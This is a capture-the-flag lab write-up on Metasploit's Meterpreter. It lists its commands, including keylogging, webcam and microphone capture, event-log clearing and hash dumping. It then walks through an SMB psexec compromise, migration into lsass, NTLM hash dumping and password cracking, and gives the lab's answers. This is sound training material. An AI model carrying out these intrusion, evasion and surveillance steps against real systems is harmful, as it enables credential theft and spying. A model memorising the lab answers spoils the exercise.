# Metasploit: Meterpreter

> Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans.

> Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.

`Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.`

There are so many meterpreter payloads to use. We can decide which version of Meterpreter to use based on three factors:

* The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
* Components available on the target system (Is Python installed? Is this a PHP website? etc.)
* Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.) 

## Meterpreter Commands (Task 3)

### Core commands

* `background` : Backgrounds the current session
* `exit` : Terminate the Meterpreter session
* `guid` : Get the session GUID (Globally Unique Identifier)
* `help` : Displays the help menu
* `info` : Displays information about a Post module
* `irb` : Opens an interactive Ruby shell on the current session
* `load` : Loads one or more Meterpreter extensions
* `migrate` : Allows you to migrate Meterpreter to another process
* `run` : Executes a Meterpreter script or Post module
* `sessions` : Quickly switch to another session

### File system commands

* `cd` : Will change directory
* `ls` : Will list files in the current directory (dir will also work)
* `pwd` : Prints the current working directory
* `edit` : will allow you to edit a file
* `cat` : Will show the contents of a file to the screen
* `rm` : Will delete the specified file
* `search` : Will search for files
* `upload` : Will upload a file or directory
* `download` : Will download a file or directory

### Networking commands

* arp: Displays the host ARP (Address Resolution Protocol) cache
* ifconfig: Displays network interfaces available on the target system
* netstat: Displays the network connections
* portfwd: Forwards a local port to a remote service
* route: Allows you to view and modify the routing table

### System commands

* `clearev` : Clears the event logs
* `execute` : Executes a command
* `getpid` : Shows the current process identifier
* `getuid` : Shows the user that Meterpreter is running as
* `kill` : Terminates a process
* `pkill` : Terminates processes by name
* `ps` : Lists running processes
* `reboot` : Reboots the remote computer
* `shell` : Drops into a system command shell
* `shutdown` : Shuts down the remote computer
* `sysinfo` : Gets information about the remote system, such as OS

### Others Commands (these will be listed under different menu categories in the help menu)

* `idletime` : Returns the number of seconds the remote user has been idle
* `keyscan_dump` : Dumps the keystroke buffer
* `keyscan_start` : Starts capturing keystrokes
* `keyscan_stop` : Stops capturing keystrokes
* `screenshare` : Allows you to watch the remote user's desktop in real time
* `screenshot` : Grabs a screenshot of the interactive desktop
* `record_mic` : Records audio from the default microphone for X seconds
* `webcam_chat` : Starts a video chat
* `webcam_list` : Lists webcams
* `webcam_snap` : Takes a snapshot from the specified webcam
* `webcam_stream` : Plays a video stream from the specified webcam
* `getsystem` : Attempts to elevate your privilege to that of local system
* `hashdump` : Dumps the contents of the SAM database

## Post-Exploitation Challenge (Task 5)

* Meterpreter provides several important post-exploitation tools.
* Meterpreter is also a good base we can use to run post-exploitation modules available on the Metasploit framework. We use `load` command to leverage additional tools such as `Kiwi` or even the whole `Python` language.
* `load python` & `load kiwi` commands are used.

We can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

* `Username: ballen`
* `Password: Password1`

* selecting SMB module by using command `use exploit/windows/smb/psexec`.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/64e9b29e-fb9b-4779-a079-f7f4f6baf5b4)

* We need to provide parameters of `rhosts`,`SMBUser` and `SMBPass`.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d35f5a25-ac7d-4988-b0c7-f4e9f5e2f29c)

* Give `exploit` or `run` command to run the exploit. We will be directed to meterpreter session.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/c711f49e-4000-4d26-b453-05d072ba0c2e)

Run `sysinfo` to get the system information like Name,OS,Architecture and Domain etc.

### What is the computer name?

    ACME-TEST

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d2117a8d-f7f8-4c1a-89e0-45b48d8ed8f0)

### What is the target domain?

    FLASH
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/ebc101ac-9b88-46f5-a216-435efb79bb71)

### What is the name of the share likely created by the user?

        speedster
        
* First, we come out of the meterpreter session by using Ctrl+Z
* It will show the session ID. Note it.
* As we're looking for user shares search for the modules by using `search shares`.
* We got the options and `post/windows/gather/enum_shares` options looks apt for our task.
* Select it and see the options.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/0d3112dc-b119-4e0e-a552-92d50fb1a56a)

* Set the session ID that showed already by using `set SESSION <id>`.
* `run` the module.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/87fc9b49-373f-4115-91d6-f45bcb5c5ad7)

* We can see the above result consists of 3 shares.
* Last share's PATH consists of `C:\Shares\speedster` which likely created by user.
* That's the share created by the user.

### What is the NTLM hash of the jchambers user?

        69596c7aa1e8daee17f8e78870e25a5c
  
* Lets get back to the meterpreter session we left at halfway by using command `sessions -i <id>`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f5e86740-3760-4040-b90f-0a2543367726)

* To find the has of the user, first we need to migrate to the `LSASS process`.
* `lsass.exe` is a Windows process that takes care of security policy for the OS. For example, when you logon to a Windows user account or server lsass.exe verifies the logon name and password.
* Migrating to another process will help Meterpreter interact with it.
* To migrate it, first we need to find its process ID.
* `ps` command is used to find the processes id.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d7caadb6-fc54-46a8-b064-4fc7869b78dd)

* We found the `lsaas.exe` process ID and migrate the process using its ID.
* `migrate 764` command is used.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/b5b8cc88-0192-4193-aa96-879355ba2840)

* Now we give `hashdump` command to see the hash.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/ede8d370-edd1-49fb-a12d-9cd498040732)

### What is the cleartext password of the jchambers user?

        Trustno1
        
* As we got the hash of the user already. We use password cracking tools to find out the cleartext password.
* We can use tools such as John the Ripper or hashcat to find the password from the hash.
* There is a easy way of finding out password from hash by using `crackstation.net` site.

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/c1f1cb52-88b2-4627-96d3-c5a2ce59c6cd)

### Where is the "secrets.txt"  file located?

        c: Program Files (x86) Windows Multimedia Platform
        
* To search a file, we use command `search -f <filename>`
* `search -f secrets.txt`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/e1c73b1f-1397-45b1-826d-c886c2a2349a)

* `cat` command is used to display the contents of the file.
* `cat c:/Program Files (x86)/Windows Multimedia Platform/secrets.txt`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/1565e8ad-4fe6-4baf-87ff-02a2a4201318)

### What is the Twitter password revealed in the "secrets.txt" file?

        KDSvbsw3849
        
### Where is the "realsecret.txt" file located?
        
        c:\inetpub\wwwroot

* `search -f realsecret.txt`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/a3a4e3d6-8f52-41de-995d-a13eb29d1611)

### What is the real secret?

        The Flash is the fastest man alive
        
* `cat "c:/inetpub/wwwroot/secrets.txt"`

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7300e1c0-f6eb-420d-8d4f-a939eeb258df)
